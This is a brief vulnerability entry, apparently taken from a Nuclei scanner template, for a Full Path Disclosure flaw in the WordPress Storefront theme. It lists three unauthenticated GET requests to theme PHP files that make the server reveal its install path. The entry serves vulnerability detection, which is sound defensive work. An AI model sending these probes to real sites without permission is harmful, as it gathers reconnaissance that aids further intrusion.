# Vulnerability: WordPress Storefront Theme - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wordpress-storefront-fpd.yaml`)

## Description
The Storefront theme for WordPress was detected to be vulnerable to Full Path Disclosure, allowing unauthenticated attackers to obtain the full application path that could aid other attacks when combined with another vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/storefront/functions.php
GET {{BaseURL}}/wp-content/themes/storefront/header.php
GET {{BaseURL}}/wp-content/themes/storefront/footer.php
```

